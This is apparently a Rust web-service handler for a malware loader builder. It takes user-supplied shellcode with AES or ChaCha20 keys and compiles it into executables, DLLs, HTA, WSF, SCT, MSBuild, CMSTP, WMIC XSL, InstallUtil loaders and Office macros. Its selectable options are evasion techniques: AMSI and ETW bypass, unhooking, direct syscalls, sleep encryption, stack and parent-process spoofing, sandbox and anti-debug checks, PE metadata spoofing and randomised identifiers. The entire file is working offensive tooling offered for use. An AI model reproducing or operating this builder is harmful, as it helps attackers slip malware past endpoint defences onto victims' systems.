use axum::{extract::State, http::StatusCode, response::Json};
use serde::{Deserialize, Serialize};
use std::path::PathBuf;
use tracing::error;
use crate::{
    builder::{
        job_store::{JobStatus, JobStore},
        pe_sign::PeMetadata,
        rustc_runner::compile_loader,
    },
    state::AppState,
};
use template_engine::{
    generate_loader_source, generate_script_source, generate_vba_source,
    generate_csharp_source, generate_appdomain_config, generate_wsf_stub_source,
    AppDomainTemplateConfig,
    Encryption, Feature, LoaderConfig, LoaderType, AppDomainConfig, WsfStubConfig,
    OutputCategory,
};

#[derive(Deserialize)]
pub struct AppDomainReq {
    #[serde(default = "default_clr_version")]
    pub clr_version: String,
    #[serde(default = "default_net_version")]
    pub net_version: String,
}

fn default_clr_version() -> String { "v4.0.30319".into() }
fn default_net_version()  -> String { "4.0".into() }

#[derive(Deserialize)]
pub struct GenerateRequest {
    pub loader_type:      String,
    pub features:         Vec<String>,
    pub encryption:       String,
    pub shellcode_hex:    String,
    pub key_hex:          String,
    pub iv_hex:           String,
    pub pe_config:        Option<PeMetadata>,
    pub appdomain_config: Option<AppDomainReq>,
}

#[derive(Serialize)]
pub struct GenerateResponse {
    pub job_id: String,
}

pub async fn generate(
    State(state): State<AppState>,
    headers:      axum::http::HeaderMap,
    Json(req):    Json<GenerateRequest>,
) -> (StatusCode, Json<GenerateResponse>) {
    let token = headers
        .get(axum::http::header::AUTHORIZATION)
        .and_then(|v| v.to_str().ok())
        .and_then(|v| v.strip_prefix("Bearer "))
        .unwrap_or("__unknown__");
    if !state.generate_limiter.check_and_record(token) {
        return (StatusCode::TOO_MANY_REQUESTS, Json(GenerateResponse { job_id: String::new() }));
    }
    let job_id    = state.jobs.create_job();
    let job_clone = job_id.clone();
    let jobs      = state.jobs.clone();
    let cfg       = state.config.clone();

    tokio::task::spawn_blocking(move || {
        run_build(job_clone, req, jobs, cfg);
    });

    (StatusCode::ACCEPTED, Json(GenerateResponse { job_id }))
}

fn rand_hex_ident(len: usize) -> String {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    let first = (rng.gen_range(b'a'..=b'z') as char).to_string();
    let rest: String = (0..len.saturating_sub(1))
        .map(|_| {
            let n: u8 = rng.gen_range(0..36);
            if n < 10 { (b'0' + n) as char } else { (b'a' + n - 10) as char }
        })
        .collect();
    format!("{}{}", first, rest)
}

fn run_build(
    job_id: String,
    req:    GenerateRequest,
    jobs:   JobStore,
    cfg:    crate::config::Config,
) {
    let tx = match jobs.get_sender(&job_id) {
        Some(t) => t,
        None    => return,
    };

    jobs.set_status(&job_id, JobStatus::Building { progress: 5, msg: "Parsing config...".into() });

    let loader_type = match req.loader_type.as_str() {
        "Binary"      => LoaderType::Binary,
        "Dll"         => LoaderType::Dll,
        "AppDomain"   => LoaderType::AppDomain,
        "Injector"    => LoaderType::Injector,
        "Rundll32"    => LoaderType::Rundll32,
        "Wsf"         => LoaderType::Wsf,
        "Hta"         => LoaderType::Hta,
        "Regsvr32Sct" => LoaderType::Regsvr32Sct,
        "MsBuild"     => LoaderType::MsBuild,
        "Cmstp"       => LoaderType::Cmstp,
        "WmicXsl"     => LoaderType::WmicXsl,
        "DocxMacro"   => LoaderType::DocxMacro,
        "XlsxMacro"   => LoaderType::XlsxMacro,
        "InstallUtil" => LoaderType::InstallUtil,
        t => {
            jobs.set_status(&job_id, JobStatus::Error { msg: format!("unknown loader type: {}", t) });
            return;
        }
    };

    let features: Vec<Feature> = req.features.iter()
        .filter_map(|f| match f.as_str() {
            "DirectSyscall"    => Some(Feature::DirectSyscall),
            "UnhookDisk"       => Some(Feature::UnhookDisk),
            "UnhookKnownDlls"  => Some(Feature::UnhookKnownDlls),
            "ModuleStomp"      => Some(Feature::ModuleStomp),
            "SleepEncrypt"     => Some(Feature::SleepEncrypt),
            "StackSpoof"       => Some(Feature::StackSpoof),
            "SandboxDomain"    => Some(Feature::SandboxDomain),
            "SandboxUser"      => Some(Feature::SandboxUser),
            "PpidSpoof"        => Some(Feature::PpidSpoof),
            "AmsiHwbp"         => Some(Feature::AmsiHwbp),
            "EtwHwbp"          => Some(Feature::EtwHwbp),
            "PeCloak"          => Some(Feature::PeCloak),
            "AntiDebug"        => Some(Feature::AntiDebug),
            "PeSpoofing"       => Some(Feature::PeSpoofing),
            "Staged"           => Some(Feature::Staged),
            "AppDomain"        => Some(Feature::AppDomain),
            "ThreadlessInject" => Some(Feature::ThreadlessInject),
            _                  => None,
        }).collect();

    let encryption = match req.encryption.as_str() {
        "Aes256"   => Encryption::Aes256,
        "Chacha20" => Encryption::Chacha20,
        e => {
            jobs.set_status(&job_id, JobStatus::Error { msg: format!("unknown encryption: {}", e) });
            return;
        }
    };

    fn is_valid_hex(s: &str) -> bool {
        !s.is_empty() && s.len() % 2 == 0 && s.bytes().all(|b| b.is_ascii_hexdigit())
    }

    let sc_hex  = req.shellcode_hex.replace(' ', "");
    let key_hex = req.key_hex.replace(' ', "");
    let iv_hex  = req.iv_hex.replace(' ', "");

    if !is_valid_hex(&sc_hex) || sc_hex.len() > 2_000_000 {
        jobs.set_status(&job_id, JobStatus::Error { msg: "shellcode_hex: invalid or exceeds 1MB".into() });
        return;
    }
    if key_hex.len() != 64 || !is_valid_hex(&key_hex) {
        jobs.set_status(&job_id, JobStatus::Error { msg: "key_hex must be exactly 64 hex chars (32 bytes)".into() });
        return;
    }
    if iv_hex.len() != 32 || !is_valid_hex(&iv_hex) {
        jobs.set_status(&job_id, JobStatus::Error { msg: "iv_hex must be exactly 32 hex chars (16 bytes)".into() });
        return;
    }

    let appdomain_config = if loader_type == LoaderType::AppDomain {
        let req_ad = req.appdomain_config.unwrap_or(AppDomainReq {
            clr_version: "v4.0.30319".into(),
            net_version: "4.0".into(),
        });
        Some(AppDomainConfig {
            clr_version:   req_ad.clr_version,
            net_version:   req_ad.net_version,
            assembly_name: rand_hex_ident(12),
            type_name:     rand_hex_ident(10),
            namespace:     rand_hex_ident(8),
        })
    } else {
        None
    };

    // DotNetToJScript loaders (WSF/HTA/SCT/WMIC.XSL) all embed a .NET stub
    let uses_dotnettojscript = matches!(loader_type,
        LoaderType::Wsf | LoaderType::Hta | LoaderType::Regsvr32Sct | LoaderType::WmicXsl);
    let wsf_stub_config = if uses_dotnettojscript {
        Some(WsfStubConfig {
            namespace: rand_hex_ident(8),
            type_name: rand_hex_ident(10),
        })
    } else {
        None
    };

    let mut loader_cfg = LoaderConfig {
        loader_type,
        features,
        encryption,
        shellcode_hex:    sc_hex,
        key_hex,
        iv_hex,
        pe_config:        None,
        appdomain_config,
        wsf_stub_config,
        dotnet_stub_hex:  None,
    };

    jobs.set_status(&job_id, JobStatus::Building { progress: 10, msg: "Generating source...".into() });

    let job_dir = PathBuf::from(&cfg.artifacts_dir).join(&job_id);
    if let Err(e) = std::fs::create_dir_all(&job_dir) {
        jobs.set_status(&job_id, JobStatus::Error { msg: e.to_string() });
        return;
    }

    let category = loader_cfg.loader_type.category();
    let out_ext  = loader_cfg.loader_type.output_extension();
    let out_path = job_dir.join(format!("loader.{}", out_ext));

    match category {
        OutputCategory::PeCompiled => {
            let source = match generate_loader_source(&loader_cfg) {
                Ok(s)  => s,
                Err(e) => { jobs.set_status(&job_id, JobStatus::Error { msg: e }); return; }
            };
            let src_path = job_dir.join("loader_config.rs");
            if let Err(e) = std::fs::write(&src_path, &source) {
                jobs.set_status(&job_id, JobStatus::Error { msg: e.to_string() });
                return;
            }

            jobs.set_status(&job_id, JobStatus::Building { progress: 30, msg: "Compiling Rust source...".into() });

            let crate_type = match loader_cfg.loader_type {
                LoaderType::Binary | LoaderType::Injector => "bin",
                _                                          => "cdylib",
            };

            if let Err(e) = compile_loader(
                src_path.to_str().unwrap(),
                &cfg.scaffold_rlib,
                out_path.to_str().unwrap(),
                crate_type,
                &tx,
            ) {
                jobs.set_status(&job_id, JobStatus::Error { msg: e.to_string() });
                return;
            }

            // Apply PE metadata if requested
            if let Some(pe_meta) = &req.pe_config {
                if let Err(e) = crate::builder::pe_sign::apply_pe_metadata(
                    out_path.to_str().unwrap(), pe_meta, &tx,
                ) {
                    error!("PE metadata failed: {}", e);
                }
            }
        }
        OutputCategory::ScriptText => {
            // Pre-compile .NET stub for all DotNetToJScript loaders
            if matches!(loader_cfg.loader_type,
                LoaderType::Wsf | LoaderType::Hta | LoaderType::Regsvr32Sct | LoaderType::WmicXsl) {
                jobs.set_status(&job_id, JobStatus::Building { progress: 40, msg: "Compiling WSF .NET stub...".into() });
                match generate_wsf_stub_source(&loader_cfg) {
                    Ok(stub_cs) => {
                        let stub_cs_path  = job_dir.join("stub.cs");
                        let stub_dll_path = job_dir.join("stub.dll");
                        if std::fs::write(&stub_cs_path, &stub_cs).is_ok() {
                            match crate::builder::csharp_runner::compile_csharp(
                                stub_cs_path.to_str().unwrap(),
                                stub_dll_path.to_str().unwrap(),
                            ) {
                                Ok(()) => {
                                    if let Ok(bytes) = std::fs::read(&stub_dll_path) {
                                        let hex: String = bytes.iter()
                                            .map(|b| format!("{:02x}", b))
                                            .collect();
                                        loader_cfg.dotnet_stub_hex = Some(hex);
                                    }
                                }
                                Err(e) => {
                                    error!("WSF stub compile failed (stub will use placeholder): {}", e);
                                }
                            }
                        }
                    }
                    Err(e) => {
                        error!("WSF stub source generation failed: {}", e);
                    }
                }
            }
            jobs.set_status(&job_id, JobStatus::Building { progress: 60, msg: "Rendering script template...".into() });
            let source = match generate_script_source(&loader_cfg) {
                Ok(s)  => s,
                Err(e) => { jobs.set_status(&job_id, JobStatus::Error { msg: e }); return; }
            };
            if let Err(e) = std::fs::write(&out_path, &source) {
                jobs.set_status(&job_id, JobStatus::Error { msg: e.to_string() });
                return;
            }
        }
        OutputCategory::VbaText => {
            jobs.set_status(&job_id, JobStatus::Building { progress: 60, msg: "Rendering VBA macro source (copy-paste manually into Office)...".into() });
            let source = match generate_vba_source(&loader_cfg) {
                Ok(s)  => s,
                Err(e) => { jobs.set_status(&job_id, JobStatus::Error { msg: e }); return; }
            };
            if let Err(e) = std::fs::write(&out_path, &source) {
                jobs.set_status(&job_id, JobStatus::Error { msg: e.to_string() });
                return;
            }
        }
        OutputCategory::DotNetCompiled => {
            jobs.set_status(&job_id, JobStatus::Building { progress: 30, msg: "Generating C# source...".into() });
            let cs_source = match generate_csharp_source(&loader_cfg) {
                Ok(s)  => s,
                Err(e) => { jobs.set_status(&job_id, JobStatus::Error { msg: e }); return; }
            };
            let cs_path = job_dir.join("Loader.cs");
            if let Err(e) = std::fs::write(&cs_path, &cs_source) {
                jobs.set_status(&job_id, JobStatus::Error { msg: e.to_string() });
                return;
            }
            jobs.set_status(&job_id, JobStatus::Building { progress: 60, msg: "Compiling C# with csc.exe / mcs...".into() });
            if let Err(e) = crate::builder::csharp_runner::compile_csharp(
                cs_path.to_str().unwrap(),
                out_path.to_str().unwrap(),
            ) {
                jobs.set_status(&job_id, JobStatus::Error { msg: e });
                return;
            }
        }
    }

    let download_id = uuid::Uuid::new_v4().to_string();

    let dl_link = PathBuf::from(&cfg.artifacts_dir).join(&download_id);
    let _ = std::fs::write(
        dl_link.with_extension("path"),
        out_path.to_str().unwrap(),
    );

    let config_xml = if loader_cfg.loader_type == LoaderType::AppDomain {
        loader_cfg.appdomain_config.as_ref().and_then(|ad| {
            generate_appdomain_config(&AppDomainTemplateConfig {
                clr_version:    ad.clr_version.clone(),
                net_version:    ad.net_version.clone(),
                appdomain_name: format!("{}.{}", ad.namespace, ad.type_name),
                assembly_name:  ad.assembly_name.clone(),
            }).ok()
        })
    } else {
        None
    };

    jobs.set_status(&job_id, JobStatus::Done { download_id, config_xml });
}
